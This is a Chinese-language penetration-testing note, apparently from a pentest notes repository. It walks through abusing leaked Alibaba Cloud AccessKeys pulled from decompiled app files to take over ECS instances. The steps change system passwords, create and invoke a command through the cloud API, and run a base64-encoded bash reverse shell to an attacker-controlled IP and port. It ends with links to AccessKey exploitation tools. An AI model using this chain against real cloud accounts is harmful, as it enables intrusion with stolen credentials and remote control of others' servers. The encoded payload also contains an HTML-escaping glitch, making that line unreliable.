	反编译app文件，查找可能会包含oss key的文件，如JS。
	OSSAccessKey、AccessKeySecret使用OSS浏览器访问。
	第三方行云管家可修改系统密码。
	反弹shell
	From: https://xz.aliyun.com/t/8310
	https://api.aliyun.com/#/?product=Ecs
	搜索框搜索选择CreateCommand来创建一个命令
	CommandContent填命令的base64，Type填RunShellScript
	命令echo "bash -i >& /dev/tcp/你的IP/端口 0>&1"| base64
	bash -i >& /dev/tcp/你的IP/端口 0>&1
	YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMCZndDsmMQ==
	填好以后点调试SDK
	会直接给你起一个Cloud shell
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/842.png)

	并创建一个CreateCommand.py文件，使用vi编辑
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/843.png)

	填accessKeyId,accessSecret保存执行，并记录Commandid
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/844.png)

	再次在搜索框搜索InvokeCommand
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/845.png)

	Commandid填上面请求的返回值，InstanceId填行云管家显示的实例ID
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/846.png)

	填好了点调试sdk然后编辑文件把accessKeyId accessSecret填一下，执行
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/847.png)

	然后看监听的服务器shell已经反弹成功
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/848.png)

  ####工具
	https://github.com/iiiusky/alicloud-tools
	https://github.com/mrknow001/aliyun-accesskey-Tools